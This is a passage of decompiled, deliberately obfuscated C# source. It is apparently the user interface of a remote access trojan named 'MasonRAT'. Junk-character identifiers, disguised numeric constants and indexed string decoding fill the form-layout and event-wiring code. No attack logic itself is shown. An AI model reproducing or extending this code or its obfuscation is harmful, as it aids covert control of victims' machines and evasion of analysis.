    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.RenderStyle.BorderColor = Color.FromArgb((1792118202 - 568098329 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0) - (1484062516 - 260042716 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 ^ 0, (~1138500503 - 1906598769 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 ^ (1165990857 + -1131031424 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0 | (1216305298 ^ 17) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 << 1), ((1101639355 > 1587436563 ? 2147393326 : 1610544995) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) ^ (1692010136 - 626463667 % 535520533 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1) | 269681533 + 1411367357 % 39471199 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1));
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.RenderStyle.ColorTable = (ProfessionalColorTable) null;
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.RenderStyle.RoundedEdges = true;
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.RenderStyle.SelectionArrowColor = Color.FromArgb(-1343006533 - 2074794410 % 1612575558 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - ~(587657057 + (76098025 << 949044356) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0), 1331634914 - 120320351 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) - (1114593743 - -96720760 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0), ((814315306 > 979879538 ? -78661 : -58996) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1)) + (924249786 - ~1014064697 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0 >> (1351635284 - 186536613 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1));
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.RenderStyle.SelectionBackColor = Color.FromArgb(1925485392 - 1429357114 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - (-1945890638 - (1895003022 << 1140830285) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0)) % (1540396938 - (583007291 << 987378989) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1), ((391506053 ^ ~1298798370) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 << 1)) - ((619765183 ^ 805126289 % 1695947611) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> -0 << 487461515 - -1168295914 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0), -1859817794 - 136605117 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 + ((-1199282501 ^ -1394985711) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1) | -2080512638 - 491333294 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0));
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.RenderStyle.SelectionForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.RenderStyle.SeparatorColor = Color.FromArgb((-371364753 - 1019829869 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ -(653053490 + 738141059 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 << 1, ((-683659421 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0 ^ -(1820061144 + ~1136401703 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 + 0))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 + 0), (898960171 - (36751609 >> 1452160229) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0)) + ~((882527264 ^ 295470711 >> 1585311748) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0);
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.RenderStyle.TextRenderingHint = TextRenderingHint.SystemDefault;
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.Size = new Size((-381732685 - ~381732873 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0 ^ (666982740 >> 583664067) - 83372838 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0, 82);
    this.\u2694️MasonRAT\u270Cـــد\u0609ڣـﻻ\u060Dڠ\u060B\u060Dـﻻا̍ـڦ\u060Eٺ.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cـــد\u0609ڣـﻻ\u060Dڠ\u060B\u060Dـﻻا̍ـڦ\u060Eٺ.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2748));
    this.\u2694️MasonRAT\u270Cـــد\u0609ڣـﻻ\u060Dڠ\u060B\u060Dـﻻا̍ـڦ\u060Eٺ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2749);
    this.\u2694️MasonRAT\u270Cـــد\u0609ڣـﻻ\u060Dڠ\u060B\u060Dـﻻا̍ـڦ\u060Eٺ.Size = new Size((1416273826 ^ -549014630) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0) - ((-411698330 - -1155753462 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) << (1596444551 ^ 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0 + 0, 28);
    this.\u2694️MasonRAT\u270Cـــد\u0609ڣـﻻ\u060Dڠ\u060B\u060Dـﻻا̍ـڦ\u060Eٺ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2750);
    this.\u2694️MasonRAT\u270Cـ\u0608\u060Bּدـى\u060D\u0608ۭـڝ\u060Aـة\u0608\u0609څۧ\u0609.ForeColor = Color.White;
    this.\u2694️MasonRAT\u270Cـ\u0608\u060Bּدـى\u060D\u0608ۭـڝ\u060Aـة\u0608\u0609څۧ\u0609.Image = (Image) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2751));
    this.\u2694️MasonRAT\u270Cـ\u0608\u060Bּدـى\u060D\u0608ۭـڝ\u060Aـة\u0608\u0609څۧ\u0609.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2752);
    this.\u2694️MasonRAT\u270Cـ\u0608\u060Bּدـى\u060D\u0608ۭـڝ\u060Aـة\u0608\u0609څۧ\u0609.Size = new Size(((150373942 > 761675984 ? 236 : 177) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0 ^ (2012342390 ^ (552708212 | 1998702671)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1), 28);
    this.\u2694️MasonRAT\u270Cـ\u0608\u060Bּدـى\u060D\u0608ۭـڝ\u060Aـة\u0608\u0609څۧ\u0609.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2753);
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(505849526 - 1981962509 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 - ~(-1918108106 - 900745499 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - -0, 451);
    this.Controls.Add((Control) this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609);
    this.FormBorderStyle = FormBorderStyle.None;
    this.Icon = (Icon) componentResourceManager.GetObject(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2754));
    this.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2755);
    this.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2756);
    this.\u2694️MasonRAT\u270Cـڜ\u0608\u0020\u060Dـۭۙ\u060A\u060F̍ٺ.ResumeLayout(false);
    this.\u2694️MasonRAT\u270Cءـڛٺ\u060Aٽۏڼـۨ\u060Dد\u0608ڙۏـ\u0609ﻋ̨\u0609.ResumeLayout(false);
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.ResumeLayout(false);
    this.\u2694️MasonRAT\u270Cۙؤـ\u060Aٸ\u060Dٸ\u060Aْئ\u060Fط\u0608ٻ\u060D̍\u060F.PerformLayout();
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.ResumeLayout(false);
    this.\u2694️MasonRAT\u270Cټطـ\u060Eـ\u0020\u060Dْٸـءــ.PerformLayout();
    this.\u2694️MasonRAT\u270Cــ̍ـټﻻ\u060E؁طـۙ\u060A\u0609\u0608ڙ\u060B\u060Aـد.ResumeLayout(false);
    this.ResumeLayout(false);
  }

  internal virtual ListView \u2694️MasonRAT\u270Cگ\u060A\u060A\u0609\u060B\u060A\u0609̍ڇـۜـؤ
  {
    get => this.\u2694️MasonRAT\u270C\u060Dءڅ\u060Aـּۚﻋـ\u060A\u060Dـ\u060B\u0020ـ\u060C;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608ـحـ\u060Aڦ\u060Dــ\u060A\u060Aـب\u060Aڞـاـڙ\u0020);
      ListView masonRatءڅـּۚﻋـــ1 = this.\u2694️MasonRAT\u270C\u060Dءڅ\u060Aـּۚﻋـ\u060A\u060Dـ\u060B\u0020ـ\u060C;
      if (masonRatءڅـּۚﻋـــ1 != null)
        masonRatءڅـּۚﻋـــ1.SelectedIndexChanged -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Dءڅ\u060Aـּۚﻋـ\u060A\u060Dـ\u060B\u0020ـ\u060C = value;
      ListView masonRatءڅـּۚﻋـــ2 = this.\u2694️MasonRAT\u270C\u060Dءڅ\u060Aـּۚﻋـ\u060A\u060Dـ\u060B\u0020ـ\u060C;
      if (masonRatءڅـּۚﻋـــ2 == null)
        return;
      masonRatءڅـּۚﻋـــ2.SelectedIndexChanged += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ColumnHeader1")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u0609ۜﻼـ\u060Fـ\u060E\u0609\u060Bڼ\u060A\u060Aبـ\u0609\u060Dڼ\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader3")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cـﮪــط\u060F\u060A\u060Aڟۙـ\u060F\u0608ــ\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ContextMenuStrip \u2694️MasonRAT\u270Cـڜ\u0608\u0020\u060Dـۭۙ\u060A\u060F̍ٺ
  {
    get => this.\u2694️MasonRAT\u270C\u060A\u0608ﻻ\u060Fڼۨحـــدـْ\u0609ؤ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      CancelEventHandler cancelEventHandler = new CancelEventHandler(this.\u2694️MasonRAT\u270C\u060A̍ٺــ\u060B\u0609ۙـ̨\u060Fــۙۙـ\u060Aـ\u060C\u0608);
      ContextMenuStrip masonRatﻻڼۨحـــدـْؤ1 = this.\u2694️MasonRAT\u270C\u060A\u0608ﻻ\u060Fڼۨحـــدـْ\u0609ؤ;
      if (masonRatﻻڼۨحـــدـْؤ1 != null)
        masonRatﻻڼۨحـــدـْؤ1.Opening -= cancelEventHandler;
      this.\u2694️MasonRAT\u270C\u060A\u0608ﻻ\u060Fڼۨحـــدـْ\u0609ؤ = value;
      ContextMenuStrip masonRatﻻڼۨحـــدـْؤ2 = this.\u2694️MasonRAT\u270C\u060A\u0608ﻻ\u060Fڼۨحـــدـْ\u0609ؤ;
      if (masonRatﻻڼۨحـــدـْؤ2 == null)
        return;
      masonRatﻻڼۨحـــدـْؤ2.Opening += cancelEventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0609\u0020̍ــــ\u0608ټ\u0608ــﻋ\u060Aـۧټـ\u0020
  {
    get => this.\u2694️MasonRAT\u270Cۙ\u0608ټ\u060A\u0608\u060A\u060Cٺ\u060Aـ\u060D;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ̍ح\u0609̍ـ\u060A\u0609\u060A\u060D\u060Dؤ\u0020\u060C);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cۙ\u0608ټ\u060A\u0608\u060A\u060Cٺ\u060Aـ\u060D;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۙ\u0608ټ\u060A\u0608\u060A\u060Cٺ\u060Aـ\u060D = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cۙ\u0608ټ\u060A\u0608\u060A\u060Cٺ\u060Aـ\u060D;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cژـڙۛۙۡژـﻻـ\u0608ـ
  {
    get => this.\u2694️MasonRAT\u270C\u060Aــ\u060Eڙـۭاۧ\u060Aڜۛ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060B\u0609ا\u060Aﯧۜۡۏ\u060Cۡ);
      ToolStripMenuItem masonRatــڙـۭاۧڜۛ1 = this.\u2694️MasonRAT\u270C\u060Aــ\u060Eڙـۭاۧ\u060Aڜۛ;
      if (masonRatــڙـۭاۧڜۛ1 != null)
        masonRatــڙـۭاۧڜۛ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Aــ\u060Eڙـۭاۧ\u060Aڜۛ = value;
      ToolStripMenuItem masonRatــڙـۭاۧڜۛ2 = this.\u2694️MasonRAT\u270C\u060Aــ\u060Eڙـۭاۧ\u060Aڜۛ;
      if (masonRatــڙـۭاۧڜۛ2 == null)
        return;
      masonRatــڙـۭاۧڜۛ2.Click += eventHandler;
    }
  }

  internal virtual Timer \u2694️MasonRAT\u270C\u060Dـٻۜڝ\u0609ــ\u0608ىحـڦـ
  {
    get => this.\u2694️MasonRAT\u270C\u0609\u0609ﻼۧؤـؤـةڙـ\u0609\u0609;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـۙ\u0609ـــ\u0608ڠڙـ؁ـ\u0609\u060A);
      Timer masonRatﻼۧؤـؤـةڙـ1 = this.\u2694️MasonRAT\u270C\u0609\u0609ﻼۧؤـؤـةڙـ\u0609\u0609;
      if (masonRatﻼۧؤـؤـةڙـ1 != null)
        masonRatﻼۧؤـؤـةڙـ1.Tick -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609\u0609ﻼۧؤـؤـةڙـ\u0609\u0609 = value;
      Timer masonRatﻼۧؤـؤـةڙـ2 = this.\u2694️MasonRAT\u270C\u0609\u0609ﻼۧؤـؤـةڙـ\u0609\u0609;
      if (masonRatﻼۧؤـؤـةڙـ2 == null)
        return;
      masonRatﻼۧؤـؤـةڙـ2.Tick += eventHandler;
    }
  }

  internal virtual Timer \u2694️MasonRAT\u270Cـ\u0609\u0608بٺـ\u060Eﯧؤد\u0608\u0608ـټ\u0609
  {
    get => this.\u2694️MasonRAT\u270C\u0609\u060Dٸ\u060Eڙڠــ̍\u060Ą\u060D\u0608ٺڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
